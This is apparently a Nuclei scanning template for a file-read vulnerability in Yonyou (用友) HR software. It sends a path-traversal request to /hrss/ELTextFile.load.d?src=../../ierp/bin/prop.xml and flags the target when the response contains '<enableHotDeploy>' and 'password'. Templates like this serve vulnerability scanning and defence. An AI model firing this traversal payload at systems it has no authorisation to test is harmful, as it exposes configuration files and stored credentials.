id: yongyou-ELTextFile-FileRead

info:
  name: 用友文件读取
  author: str1am
  severity: high
  tags: yongyou

requests:
  - method: GET
    path:
      - "{{BaseURL}}/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<enableHotDeploy>"
          - "password"
        part: body
        condition: and
